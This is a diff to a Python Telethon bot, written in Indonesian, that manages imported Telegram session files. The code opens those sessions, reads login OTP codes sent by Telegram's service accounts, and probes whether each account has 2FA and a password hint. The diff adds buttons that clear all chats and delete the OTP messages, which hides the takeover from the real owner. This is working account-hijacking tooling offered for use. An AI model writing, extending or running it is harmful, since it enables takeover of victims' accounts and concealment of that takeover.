@@ -12,6 +12,8 @@ from datetime import datetime
 from telethon.sync import TelegramClient
 from telethon import events, Button
 from telethon.tl.functions.users import GetFullUserRequest
+from telethon.tl.functions.messages import GetHistoryRequest, DeleteHistoryRequest
+from telethon.tl.types import InputPeerUser, InputPeerChannel
 from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError
 from telethon.errors.rpcerrorlist import AuthKeyError, PhoneNumberBannedError
 
@@ -27,11 +29,14 @@ user_sessions = {}
 # Dictionary to store active sessions
 active_sessions = {}
 
+# Dictionary to track current page for each user
+user_current_page = {}
+
 # File to store active sessions
 SESSIONS_FILE = "active_sessions.json"
 
-# OTP Sender
-OTP_SENDER = "+42777"
+# OTP Sender entities
+OTP_SENDERS = ["+42777", "777000", "telegram"]
 
 # Temporary directory for zip extraction
 TEMP_DIR = "temp_zip_extraction"
@@ -130,9 +135,12 @@ async def kelola(event):
     # Convert user_id to string for dictionary key
     user_id_str = str(user_id)
     
+    # Get the current page for this user (default to 0)
+    current_page = user_current_page.get(user_id_str, 0)
+    
     if user_id_str in active_sessions and active_sessions[user_id_str]:
         # Create pagination for sessions
-        await show_session_list(user_id, 0)
+        await show_session_list(user_id, current_page)
     else:
         await event.respond("Tidak ada session aktif yang tersimpan. Silakan check session terlebih dahulu.")
 
@@ -140,6 +148,8 @@ async def show_session_list(user_id, page=0):
     """Show paginated list of active sessions."""
     try:
         user_id_str = str(user_id)
+        # Store the current page for this user
+        user_current_page[user_id_str] = page
         
         if user_id_str not in active_sessions or not active_sessions[user_id_str]:
             await bot.send_message(user_id, "Tidak ada session aktif yang tersimpan.")
@@ -239,12 +249,19 @@ async def handle_session_callback(event):
             buttons = [
                 [
                     Button.inline("📲 Get OTP", f"otp_{session_idx}"),
-                    Button.inline("🗑️ Hapus", f"delete_{session_idx}")
+                    Button.inline("🔄 Refresh Info", f"refresh_{session_idx}")
                 ],
-                [Button.inline("⬅️ Kembali", b"back_to_list")]
+                [
+                    Button.inline("🧹 Clear All Chats", f"clear_{session_idx}"),
+                    Button.inline("🧼 Clear OTP Chats", f"clear_otp_{session_idx}")
+                ],
+                [
+                    Button.inline("🗑️ Hapus", f"delete_{session_idx}"),
+                    Button.inline("⬅️ Kembali", f"back_to_list_{user_current_page.get(user_id_str, 0)}")
+                ]
             ]
             
-            # Create session info message with safer gets
+            # Create more detailed session info message
             message = (
                 f"✅ **DETAIL SESSION**\n\n"
                 f"📱 **Nomor:** `{session.get('phone', 'Tidak diketahui')}`\n"
@@ -254,7 +271,8 @@ async def handle_session_callback(event):
                 f"🆔 **User ID:** `{session.get('user_id', 'Tidak diketahui')}`\n"
                 f"📅 **Tanggal Pembuatan:** `{session.get('creation_date', 'Tidak diketahui')}`\n"
                 f"🔐 **Premium:** `{session.get('is_premium', 'Tidak diketahui')}`\n"
-                f"🔄 **2FA Aktif:** `{session.get('has_2fa', 'Tidak diketahui')}`\n"
+                f"🔄 **2FA/Password:** `{'Ya' if session.get('has_2fa') == True else 'Tidak'}`\n"
+                f"📨 **Status Terakhir:** `{session.get('last_status', 'Belum diketahui')}`\n"
             )
             
             await event.edit(message, buttons=buttons)
@@ -264,9 +282,9 @@ async def handle_session_callback(event):
         print(f"Error in handle_session_callback: {e}")
         await event.answer(f"Terjadi error: {str(e)}")
 
-@events.register(events.CallbackQuery(data=b"back_to_list"))
-async def back_to_list(event):
-    """Go back to the session list."""
+@events.register(events.CallbackQuery(data=lambda x: x.startswith(b"refresh_")))
+async def refresh_session_info(event):
+    """Refresh session information with more details."""
     try:
         user_id = event.sender_id
         
@@ -275,8 +293,255 @@ async def back_to_list(event):
             await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
             return
         
+        # Get selected session index
+        session_idx = int(event.data.decode().split("_")[1])
+        user_id_str = str(user_id)
+        
+        if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
+            session = active_sessions[user_id_str][session_idx]
+            
+            # Create status message
+            status_msg = await event.respond("⏳ Memperbarui informasi session...")
+            
+            # Get fresh session information
+            fresh_info = await get_detailed_session_info(session)
+            
+            if fresh_info['success']:
+                # Update the session info in storage
+                for key, value in fresh_info['info'].items():
+                    active_sessions[user_id_str][session_idx][key] = value
+                
+                # Save sessions
+                save_sessions()
+                
+                # Get the updated session
+                session = active_sessions[user_id_str][session_idx]
+                
+                # Create a more detailed message with the updated info
+                message = (
+                    f"✅ **DETAIL SESSION (DIPERBARUI)**\n\n"
+                    f"📱 **Nomor:** `{session.get('phone', 'Tidak diketahui')}`\n"
+                    f"👤 **Nama Depan:** `{session.get('first_name', 'Tidak diketahui')}`\n"
+                    f"👤 **Nama Belakang:** `{session.get('last_name', 'Tidak ada')}`\n"
+                    f"🔖 **Username:** `{session.get('username', 'Tidak ada')}`\n"
+                    f"🆔 **User ID:** `{session.get('user_id', 'Tidak diketahui')}`\n"
+                    f"📅 **Tanggal Pembuatan:** `{session.get('creation_date', 'Tidak diketahui')}`\n"
+                    f"⏰ **Terakhir Online:** `{session.get('last_online', 'Tidak diketahui')}`\n"
+                    f"🔐 **Premium:** `{session.get('is_premium', 'Tidak diketahui')}`\n"
+                    f"🔄 **2FA/Password:** `{'Ya' if session.get('has_2fa') == True else 'Tidak'}`\n"
+                    f"🔑 **Password Hint:** `{session.get('password_hint', 'Tidak ada')}`\n"
+                    f"📨 **Status Terakhir:** `{session.get('last_status', 'Aktif')}`\n"
+                    f"🌐 **Verifikasi:** `{session.get('verified', 'Tidak diketahui')}`\n"
+                    f"👥 **Jumlah Kontak:** `{session.get('contact_count', 'Tidak diketahui')}`\n"
+                )
+                
+                # Create action buttons for the session
+                buttons = [
+                    [
+                        Button.inline("📲 Get OTP", f"otp_{session_idx}"),
+                        Button.inline("🔄 Refresh Info", f"refresh_{session_idx}")
+                    ],
+                    [
+                        Button.inline("🧹 Clear All Chats", f"clear_{session_idx}"),
+                        Button.inline("🧼 Clear OTP Chats", f"clear_otp_{session_idx}")
+                    ],
+                    [
+                        Button.inline("🗑️ Hapus", f"delete_{session_idx}"),
+                        Button.inline("⬅️ Kembali", f"back_to_list_{user_current_page.get(user_id_str, 0)}")
+                    ]
+                ]
+                
+                await status_msg.edit(message, buttons=buttons)
+            else:
+                await status_msg.edit(
+                    f"❌ **GAGAL MEMPERBARUI INFO**\n\n"
+                    f"Pesan: {fresh_info['error']}",
+                    buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
+                )
+        else:
+            await event.answer("Session tidak ditemukan.")
+    except Exception as e:
+        print(f"Error in refresh_session_info: {e}")
+        try:
+            await event.answer(f"Terjadi error saat memperbarui info")
+            await event.respond(f"Error: {str(e)}", buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")])
+        except:
+            pass
+
+async def get_detailed_session_info(session):
+    """Get detailed session information."""
+    client = None
+    session_path = f"temp_session_{session.get('user_id', 'unknown')}_{int(time.time())}.session"
+    
+    result = {'success': False, 'error': 'Error tidak diketahui', 'info': {}}
+    
+    try:
+        # Try to create a client with the saved session data
+        if not session.get('session_data'):
+            return {'success': False, 'error': "Data session tidak tersedia"}
+            
+        # Write session data to file
+        with open(session_path, 'wb') as f:
+            f.write(bytes.fromhex(session['session_data']))
+        
+        # Add a small delay to avoid connection errors
+        await asyncio.sleep(1)
+        
+        # Connect to Telegram with better error handling
+        client = TelegramClient(
+            session_path.replace('.session', ''), 
+            API_ID, 
+            API_HASH, 
+            connection_retries=5,
+            retry_delay=2
+        )
+        
+        # Connect with longer timeout
+        try:
+            await asyncio.wait_for(client.connect(), timeout=20)
+        except asyncio.TimeoutError:
+            return {'success': False, 'error': "Koneksi timeout"}
+        
+        # Wait after connection
+        await asyncio.sleep(2)
+        
+        # Ensure we're connected and authorized
+        if not await client.is_user_authorized():
+            print(f"Session {session.get('phone')} tidak terotorisasi saat mencoba get details")
+            # Try once more with forced reconnection
+            await client.disconnect()
+            await asyncio.sleep(2)
+            await client.connect()
+            await asyncio.sleep(1)
+            
+            if not await client.is_user_authorized():
+                return {'success': False, 'error': "Session tidak terotorisasi setelah percobaan ulang"}
+        
+        # Get detailed user info
+        info = {}
+        
+        try:
+            # Basic user info
+            me = await client.get_me()
+            info['user_id'] = me.id
+            info['first_name'] = me.first_name
+            info['last_name'] = me.last_name
+            info['username'] = me.username
+            info['phone'] = me.phone
+            info['is_premium'] = "Ya" if getattr(me, 'premium', False) else "Tidak"
+            info['verified'] = "Ya" if getattr(me, 'verified', False) else "Tidak"
+            
+            # Get more detailed info
+            try:
+                full_user = await client(GetFullUserRequest(me.id))
+                info['about'] = getattr(full_user.full_user, 'about', 'Tidak ada')
+                info['common_chats_count'] = getattr(full_user.full_user, 'common_chats_count', 0)
+                
+                # Check for password hint if available
+                password_hint = getattr(full_user.full_user, 'password_hint', None)
+                info['password_hint'] = password_hint if password_hint else 'Tidak ada'
+                
+                # Last online status
+                last_online = getattr(me, 'status', None)
+                if last_online:
+                    if hasattr(last_online, 'was_online'):
+                        info['last_online'] = last_online.was_online.strftime('%Y-%m-%d %H:%M:%S')
+                    else:
+                        info['last_online'] = 'Baru saja'
+                else:
+                    info['last_online'] = 'Tidak diketahui'
+            except Exception as full_error:
+                print(f"Error getting full user info: {full_error}")
+                info['last_online'] = 'Tidak dapat diambil'
+            
+            # Check 2FA status
+            info['has_2fa'] = False
+            
+            # Improved 2FA detection
+            try:
+                # Try with a small API call that requires 2FA when enabled
+                try:
+                    # This might trigger a password request if 2FA is enabled
+                    await client.get_password_hint()
+                    # If we reach here without exception, no 2FA is set
+                except SessionPasswordNeededError:
+                    info['has_2fa'] = True
+                except:
+                    # Another error occurred, unsure about 2FA
+                    pass
+            except:
+                # Failed to check 2FA, keep current value
+                info['has_2fa'] = session.get('has_2fa', False)
+            
+            # Count contacts
+            try:
+                contacts = []
+                async for contact in client.iter_contacts(limit=100):
+                    contacts.append(contact)
+                info['contact_count'] = len(contacts)
+            except:
+                info['contact_count'] = 'Tidak dapat diambil'
+            
+            # Mark session as active
+            info['last_status'] = 'Aktif'
+            
+            # Update creation date if available
+            try:
+                timestamp = ((me.id >> 32) - 1420070400)
+                if timestamp > 0:
+                    info['creation_date'] = datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
+            except:
+                # Keep existing creation date if available
+                if 'creation_date' in session:
+                    info['creation_date'] = session['creation_date']
+            
+            return {'success': True, 'info': info}
+            
+        except Exception as e:
+            print(f"Error getting detailed info: {e}")
+            return {'success': False, 'error': f"Error saat mengambil info: {str(e)}"}
+    
+    except FloodWaitError as e:
+        print(f"FloodWaitError: {e}")
+        return {'success': False, 'error': f"Telegram meminta menunggu {e.seconds} detik"}
+    except Exception as e:
+        print(f"Error in get_detailed_session_info: {e}")
+        traceback.print_exc()
+        return {'success': False, 'error': str(e)}
+    finally:
+        # Ensure client is disconnected
+        if client:
+            try:
+                await client.disconnect()
+            except:
+                pass
+        
+        # Clean up session file
+        try:
+            await asyncio.sleep(1)  # Small delay before cleanup
+            if os.path.exists(session_path):
+                os.remove(session_path)
+            if os.path.exists(session_path.replace('.session', '') + '.session'):
+                os.remove(session_path.replace('.session', '') + '.session')
+        except Exception as e:
+            print(f"Error cleaning up session files: {e}")
+
+@events.register(events.CallbackQuery(data=lambda x: x.startswith(b"back_to_list_")))
+async def back_to_list(event):
+    """Go back to the session list at the specific page."""
+    try:
+        user_id = event.sender_id
+        
+        # Only allow admin to use the bot
+        if user_id != ADMIN_ID:
+            await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
+            return
+        
+        # Get the page to return to
+        page = int(event.data.decode().split("_")[3])
+        
         await event.delete()
-        await show_session_list(user_id, 0)
+        await show_session_list(user_id, page)
     except Exception as e:
         print(f"Error in back_to_list: {e}")
         await event.answer(f"Terjadi error: {str(e)}")
@@ -311,7 +576,8 @@ async def get_otp(event):
                     f"✅ **OTP DITEMUKAN**\n\n"
                     f"📱 **Untuk:** `{session.get('phone', 'Tidak diketahui')}`\n"
                     f"🔢 **Kode OTP:** `{otp_result['otp']}`\n"
-                    f"⏰ **Waktu:** `{otp_result['time']}`",
+                    f"⏰ **Waktu:** `{otp_result['time']}`\n"
+                    f"📩 **Sumber:** `{otp_result.get('source', 'Pesan Telegram')}`",
                     buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
                 )
             else:
@@ -329,6 +595,358 @@ async def get_otp(event):
             await event.respond(f"Error: {str(e)}", buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")])
         except:
             pass
+
+@events.register(events.CallbackQuery(data=lambda x: x.startswith(b"clear_")))
+async def clear_chat_history(event):
+    """Clear chat history for the selected session."""
+    try:
+        user_id = event.sender_id
+        
+        # Only allow admin to use the bot
+        if user_id != ADMIN_ID:
+            await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
+            return
+        
+        # Get selected session index
+        session_idx = int(event.data.decode().split("_")[1])
+        user_id_str = str(user_id)
+        
+        if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
+            session = active_sessions[user_id_str][session_idx]
+            
+            # Create a status message
+            status_msg = await event.respond("⏳ Sedang menghapus riwayat chat...")
+            
+            # Try to clear chat history
+            clear_result = await clear_chat_messages(session)
+            
+            if clear_result['success']:
+                await status_msg.edit(
+                    f"✅ **CHAT BERHASIL DIHAPUS**\n\n"
+                    f"📱 **Untuk:** `{session.get('phone', 'Tidak diketahui')}`\n"
+                    f"📊 **Jumlah Chat Dihapus:** `{clear_result.get('count', 'Tidak diketahui')}`",
+                    buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
+                )
+            else:
+                await status_msg.edit(
+                    f"❌ **GAGAL MENGHAPUS CHAT**\n\n"
+                    f"Pesan: {clear_result['error']}",
+                    buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
+                )
+        else:
+            await event.answer("Session tidak ditemukan.")
+    except Exception as e:
+        print(f"Error in clear_chat_history: {e}")
+        try:
+            await event.answer(f"Terjadi error saat menghapus chat")
+            await event.respond(f"Error: {str(e)}", buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")])
+        except:
+            pass
+
+@events.register(events.CallbackQuery(data=lambda x: x.startswith(b"clear_otp_")))
+async def clear_otp_chat_history(event):
+    """Clear chat history with OTP senders for the selected session."""
+    try:
+        user_id = event.sender_id
+        
+        # Only allow admin to use the bot
+        if user_id != ADMIN_ID:
+            await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
+            return
+        
+        # Get selected session index
+        session_idx = int(event.data.decode().split("_")[2])
+        user_id_str = str(user_id)
+        
+        if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
+            session = active_sessions[user_id_str][session_idx]
+            
+            # Create a status message
+            status_msg = await event.respond("⏳ Sedang menghapus pesan OTP...")
+            
+            # Try to clear OTP chat history
+            clear_result = await clear_otp_messages(session)
+            
+            if clear_result['success']:
+                await status_msg.edit(
+                    f"✅ **PESAN OTP BERHASIL DIHAPUS**\n\n"
+                    f"📱 **Untuk:** `{session.get('phone', 'Tidak diketahui')}`\n"
+                    f"📊 **Jumlah Chat OTP Dihapus:** `{clear_result.get('count', 'Tidak diketahui')}`",
+                    buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
+                )
+            else:
+                await status_msg.edit(
+                    f"❌ **GAGAL MENGHAPUS PESAN OTP**\n\n"
+                    f"Pesan: {clear_result['error']}",
+                    buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
+                )
+        else:
+            await event.answer("Session tidak ditemukan.")
+    except Exception as e:
+        print(f"Error in clear_otp_chat_history: {e}")
+        try:
+            await event.answer(f"Terjadi error saat menghapus pesan OTP")
+            await event.respond(f"Error: {str(e)}", buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")])
+        except:
+            pass
+
+async def clear_otp_messages(session):
+    """Clear OTP messages from Telegram service accounts."""
+    client = None
+    session_path = f"temp_session_{session.get('user_id', 'unknown')}_{int(time.time())}.session"
+    
+    result = {'success': False, 'error': 'Error tidak diketahui', 'count': 0}
+    
+    try:
+        # Try to create a client with the saved session data
+        if not session.get('session_data'):
+            return {'success': False, 'error': "Data session tidak tersedia"}
+            
+        # Write session data to file
+        with open(session_path, 'wb') as f:
+            f.write(bytes.fromhex(session['session_data']))
+        
+        # Add a small delay to avoid connection errors
+        await asyncio.sleep(1)
+        
+        # Connect to Telegram with better error handling
+        client = TelegramClient(
+            session_path.replace('.session', ''), 
+            API_ID, 
+            API_HASH, 
+            connection_retries=5,
+            retry_delay=2
+        )
+        
+        # Connect with longer timeout
+        try:
+            await asyncio.wait_for(client.connect(), timeout=20)
+        except asyncio.TimeoutError:
+            return {'success': False, 'error': "Koneksi timeout"}
+        
+        # Wait after connection
+        await asyncio.sleep(2)
+        
+        # Ensure we're connected and authorized
+        if not await client.is_user_authorized():
+            print(f"Session {session.get('phone')} tidak terotorisasi saat mencoba clear OTP chats")
+            # Try once more with forced reconnection
+            await client.disconnect()
+            await asyncio.sleep(2)
+            await client.connect()
+            await asyncio.sleep(1)
+            
+            if not await client.is_user_authorized():
+                return {'success': False, 'error': "Session tidak terotorisasi setelah percobaan ulang"}
+        
+        # Get dialogs and delete OTP senders only
+        cleared_count = 0
+        found_count = 0
+        
+        try:
+            # Try to delete chats with known OTP senders
+            for otp_sender in OTP_SENDERS:
+                try:
+                    entity = await client.get_entity(otp_sender)
+                    found_count += 1
+                    
+                    # Delete chat history with this OTP sender
+                    await client(DeleteHistoryRequest(
+                        peer=entity,
+                        max_id=0,
+                        just_clear=True,
+                        revoke=False
+                    ))
+                    
+                    cleared_count += 1
+                    print(f"Berhasil menghapus pesan dari {otp_sender}")
+                    
+                    # Add a small delay between deletions
+                    await asyncio.sleep(1)
+                except Exception as e:
+                    print(f"Error clearing chat with {otp_sender}: {e}")
+                    continue
+            
+            # Also look for chats that match OTP sender patterns
+            async for dialog in client.iter_dialogs(limit=20):
+                try:
+                    dialog_title = dialog.name or ""
+                    dialog_entity_type = str(type(dialog.entity))
+                    
+                    # Check if this might be an OTP service
+                    is_service_account = False
+                    
+                    # Check for common OTP sender patterns in names
+                    otp_keywords = ['telegram', 'code', 'otp', 'verification', 'login', 'service']
+                    if (any(keyword in dialog_title.lower() for keyword in otp_keywords) or 
+                        "User" in dialog_entity_type and dialog.entity.bot):
+                        is_service_account = True
+                    
+                    # Check phone-like names
+                    if not is_service_account and (
+                            dialog_title.startswith('+') or 
+                            dialog_title.isdigit() or 
+                            (dialog_title.startswith('telegram') and dialog_title[-1].isdigit())
+                        ):
+                        is_service_account = True
+                    
+                    if is_service_account:
+                        found_count += 1
+                        # Delete chat history with this service account
+                        await client(DeleteHistoryRequest(
+                            peer=dialog.entity,
+                            max_id=0,
+                            just_clear=True,
+                            revoke=False
+                        ))
+                        
+                        cleared_count += 1
+                        print(f"Berhasil menghapus pesan dari {dialog_title} (service account)")
+                        
+                        # Add a small delay between deletions
+                        await asyncio.sleep(1)
+                except Exception as dialog_error:
+                    print(f"Error clearing possible service dialog {dialog.name}: {dialog_error}")
+                    continue
+        except Exception as e:
+            print(f"Error iterating dialogs for OTP clear: {e}")
+            return {'success': False, 'error': f"Error saat mencari dialog OTP: {str(e)}"}
+        
+        if cleared_count > 0:
+            return {'success': True, 'count': cleared_count, 'found': found_count}
+        elif found_count > 0:
+            return {'success': False, 'error': f"Ditemukan {found_count} dialog OTP tapi gagal menghapus"}
+        else:
+            return {'success': False, 'error': f"Tidak ditemukan dialog OTP untuk dihapus"}
+    
+    except FloodWaitError as e:
+        print(f"FloodWaitError: {e}")
+        return {'success': False, 'error': f"Telegram meminta menunggu {e.seconds} detik"}
+    except Exception as e:
+        print(f"Error in clear_otp_messages: {e}")
+        traceback.print_exc()
+        return {'success': False, 'error': str(e)}
+    finally:
+        # Ensure client is disconnected
+        if client:
+            try:
+                await client.disconnect()
+            except:
+                pass
+        
+        # Clean up session file
+        try:
+            await asyncio.sleep(1)  # Small delay before cleanup
+            if os.path.exists(session_path):
+                os.remove(session_path)
+            if os.path.exists(session_path.replace('.session', '') + '.session'):
+                os.remove(session_path.replace('.session', '') + '.session')
+        except Exception as e:
+            print(f"Error cleaning up session files: {e}")
+
+async def clear_chat_messages(session):
+    """Clear chat messages for the session."""
+    client = None
+    session_path = f"temp_session_{session.get('user_id', 'unknown')}_{int(time.time())}.session"
+    
+    result = {'success': False, 'error': 'Error tidak diketahui', 'count': 0}
+    
+    try:
+        # Try to create a client with the saved session data
+        if not session.get('session_data'):
+            return {'success': False, 'error': "Data session tidak tersedia"}
+            
+        # Write session data to file
+        with open(session_path, 'wb') as f:
+            f.write(bytes.fromhex(session['session_data']))
+        
+        # Add a small delay to avoid connection errors
+        await asyncio.sleep(1)
+        
+        # Connect to Telegram with better error handling
+        client = TelegramClient(
+            session_path.replace('.session', ''), 
+            API_ID, 
+            API_HASH, 
+            connection_retries=5,
+            retry_delay=2
+        )
+        
+        # Connect with longer timeout
+        try:
+            await asyncio.wait_for(client.connect(), timeout=20)
+        except asyncio.TimeoutError:
+            return {'success': False, 'error': "Koneksi timeout"}
+        
+        # Wait after connection
+        await asyncio.sleep(2)
+        
+        # Ensure we're connected and authorized
+        if not await client.is_user_authorized():
+            print(f"Session {session.get('phone')} tidak terotorisasi saat mencoba clear chat")
+            # Try once more with forced reconnection
+            await client.disconnect()
+            await asyncio.sleep(2)
+            await client.connect()
+            await asyncio.sleep(1)
+            
+            if not await client.is_user_authorized():
+                return {'success': False, 'error': "Session tidak terotorisasi setelah percobaan ulang"}
+        
+        # Get dialogs
+        dialogs_count = 0
+        cleared_count = 0
+        
+        try:
+            async for dialog in client.iter_dialogs(limit=15):
+                try:
+                    dialogs_count += 1
+                    # Delete chat history for this dialog
+                    await client(DeleteHistoryRequest(
+                        peer=dialog.entity,
+                        max_id=0,
+                        just_clear=True,
+                        revoke=False
+                    ))
+                    cleared_count += 1
+                    # Add a small delay between deletions to avoid flood wait
+                    await asyncio.sleep(0.5)
+                except Exception as dialog_error:
+                    print(f"Error clearing dialog {dialog.name}: {dialog_error}")
+                    continue
+        except Exception as dialogs_error:
+            print(f"Error iterating dialogs: {dialogs_error}")
+            return {'success': False, 'error': f"Error saat mengambil dialog: {str(dialogs_error)}"}
+        
+        if cleared_count > 0:
+            return {'success': True, 'count': cleared_count}
+        else:
+            return {'success': False, 'error': f"Tidak berhasil menghapus chat (dialogs: {dialogs_count})"}
+    
+    except FloodWaitError as e:
+        print(f"FloodWaitError: {e}")
+        return {'success': False, 'error': f"Telegram meminta menunggu {e.seconds} detik"}
+    except Exception as e:
+        print(f"Error in clear_chat_messages: {e}")
+        traceback.print_exc()
+        return {'success': False, 'error': str(e)}
+    finally:
+        # Ensure client is disconnected
+        if client:
+            try:
+                await client.disconnect()
+            except:
+                pass
+        
+        # Clean up session file
+        try:
+            await asyncio.sleep(1)  # Small delay before cleanup
+            if os.path.exists(session_path):
+                os.remove(session_path)
+            if os.path.exists(session_path.replace('.session', '') + '.session'):
+                os.remove(session_path.replace('.session', '') + '.session')
+        except Exception as e:
+            print(f"Error cleaning up session files: {e}")
 
 @events.register(events.CallbackQuery(data=lambda x: x.startswith(b"delete_")))
 async def confirm_delete_session(event):
@@ -384,6 +1002,7 @@ async def delete_session(event):
         # Get selected session index
         session_idx = int(event.data.decode().split("_")[2])
         user_id_str = str(user_id)
+        current_page = user_current_page.get(user_id_str, 0)
         
         if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
             # Get session info before removing
@@ -398,7 +1017,7 @@ async def delete_session(event):
             await event.edit(
                 f"✅ **SESSION TELAH DIHAPUS**\n\n"
                 f"Session untuk `{session.get('phone', 'Tidak diketahui')}` (`{session.get('first_name', 'Tidak diketahui')}`) telah dihapus.",
-                buttons=[Button.inline("⬅️ Kembali ke Daftar", b"back_to_list")]
+                buttons=[Button.inline("⬅️ Kembali ke Daftar", f"back_to_list_{current_page}")]
             )
         else:
             await event.answer("Session tidak ditemukan.")
@@ -460,7 +1079,7 @@ async def get_latest_otp(session):
         
         try:
             # Try both OTP sender and Telegram service account with better handling
-            sender_entities = [OTP_SENDER, '+42777', '777000', 'telegram']  # Add more variations of OTP sender
+            sender_entities = OTP_SENDERS
             
             for sender in sender_entities:
                 try:
@@ -491,7 +1110,8 @@ async def get_latest_otp(session):
                                 return {
                                     'success': True,
                                     'otp': otp_code,
-                                    'time': msg.date.strftime('%Y-%m-%d %H:%M:%S')
+                                    'time': msg.date.strftime('%Y-%m-%d %H:%M:%S'),
+                                    'source': sender
                                 }
                     else:
                         print(f"Tidak ada pesan dari {sender}")
@@ -668,8 +1288,9 @@ async def process_single_session(file_path, user_id, message_id, processing_msg=
                     'phone': result.get('phone', 'Tidak diketahui'),
                     'creation_date': creation_date,
                     'is_premium': result.get('is_premium', 'Tidak diketahui'),
-                    'has_2fa': result.get('has_2fa', 'Tidak diketahui'),
-                    'session_data': session_data
+                    'has_2fa': result.get('has_2fa'),  # Store actual boolean for 2FA
+                    'session_data': session_data,
+                    'last_status': 'Baru Diimpor'
                 })
                 
                 # Save sessions
@@ -684,7 +1305,8 @@ async def process_single_session(file_path, user_id, message_id, processing_msg=
                 f"🆔 **User ID:** `{result.get('user_id', 'Tidak diketahui')}`\n"
                 f"📅 **Tanggal Pembuatan:** `{creation_date}`\n"
                 f"🔐 **Premium:** `{result.get('is_premium', 'Tidak diketahui')}`\n"
-                f"🔄 **2FA Aktif:** `{result.get('has_2fa', 'Tidak diketahui')}`\n"
+                f"🔄 **2FA/Password:** `{'Ya' if result.get('has_2fa') == True else 'Tidak'}`\n"
+                f"🔑 **Password Hint:** `{result.get('password_hint', 'Tidak ada')}`\n"
             )
         else:
             message = f"❌ **SESSION TIDAK VALID**\n\nError: {result.get('error', 'Error tidak diketahui')}"
@@ -807,8 +1429,10 @@ async def process_zip_file(file_path, user_id, message_id):
                                 'phone': result.get('phone', 'Tidak diketahui'),
                                 'creation_date': creation_date,
                                 'is_premium': result.get('is_premium', 'Tidak diketahui'),
-                                'has_2fa': result.get('has_2fa', 'Tidak diketahui'),
-                                'session_data': session_data
+                                'has_2fa': result.get('has_2fa'),  # Store actual boolean
+                                'session_data': session_data,
+                                'password_hint': result.get('password_hint', 'Tidak ada'),
+                                'last_status': 'Baru Diimpor'
                             })
                 
                 # Save sessions
@@ -872,7 +1496,7 @@ async def check_session_file(file_path):
         result['session_path'] = session_path
         
         # Try to create a client with the session
-        client = TelegramClient(session_path, API_ID, API_HASH, connection_retries=2)
+        client = TelegramClient(session_path, API_ID, API_HASH, connection_retries=3)
         
         # Connect with timeout
         try:
@@ -882,14 +1506,14 @@ async def check_session_file(file_path):
             return result
         
         # Add a small delay after connection
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(1)
         
         # Check authorization
         if await client.is_user_authorized():
             result['valid'] = True
             
             # Add a small delay before getting user info
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(1)
             
             try:
                 # Get the current user info
@@ -903,8 +1527,38 @@ async def check_session_file(file_path):
                 result['phone'] = me.phone
                 result['is_premium'] = "Ya" if getattr(me, 'premium', False) else "Tidak"
                 
-                # Check if 2FA is enabled
-                result['has_2fa'] = "Tidak dapat ditentukan"
+                # Get full user info with potentially more details
+                try:
+                    full_user = await client(GetFullUserRequest(me.id))
+                    result['about'] = getattr(full_user.full_user, 'about', None)
+                    
+                    # Check for password hint
+                    result['password_hint'] = getattr(full_user.full_user, 'password_hint', None)
+                except:
+                    # Couldn't get full user info
+                    pass
+                
+                # Properly check if 2FA is enabled - default to False
+                result['has_2fa'] = False
+                
+                # Try to detect 2FA status more accurately
+                try:
+                    # Try to get full user info that might have 2FA status
+                    if hasattr(full_user, 'full_user') and hasattr(full_user.full_user, 'has_password'):
+                        result['has_2fa'] = full_user.full_user.has_password
+                except:
+                    pass
+                
+                # If we still don't know, try with password hint API
+                if not result.get('has_2fa'):
+                    try:
+                        # This might trigger a password request if 2FA is enabled
+                        await client.get_password_hint()
+                    except SessionPasswordNeededError:
+                        result['has_2fa'] = True
+                    except:
+                        # Another error occurred, unsure about 2FA - will try other methods
+                        pass
                 
                 # Try to get creation date (estimation based on user ID)
                 try:
@@ -922,8 +1576,24 @@ async def check_session_file(file_path):
         else:
             result['error'] = "Session tidak terotorisasi"
     except SessionPasswordNeededError:
-        result['error'] = "Password 2FA diperlukan"
-        result['has_2fa'] = "Ya"
+        # This is actually a valid session, but with 2FA enabled
+        result['valid'] = True
+        result['has_2fa'] = True
+        
+        # Try to get password hint
+        try:
+            hint = await client.get_password_hint()
+            result['password_hint'] = hint if hint else "Tidak ada"
+        except:
+            result['password_hint'] = "Tidak ada"
+            
+        # Get other basic info from database (might be limited)
+        try:
+            me = await client.get_me(input_peer=True)
+            if hasattr(me, 'user_id'):
+                result['user_id'] = me.user_id
+        except:
+            pass
     except PhoneNumberInvalidError:
         result['error'] = "Nomor telepon dalam session tidak valid"
     except PhoneNumberBannedError:
@@ -991,8 +1661,11 @@ async def main():
     bot.add_event_handler(handle_message)
     bot.add_event_handler(handle_page_callback)
     bot.add_event_handler(handle_session_callback)
+    bot.add_event_handler(refresh_session_info)
     bot.add_event_handler(back_to_list)
     bot.add_event_handler(get_otp)
+    bot.add_event_handler(clear_chat_history)
+    bot.add_event_handler(clear_otp_chat_history)
     bot.add_event_handler(confirm_delete_session)
     bot.add_event_handler(delete_session)
     
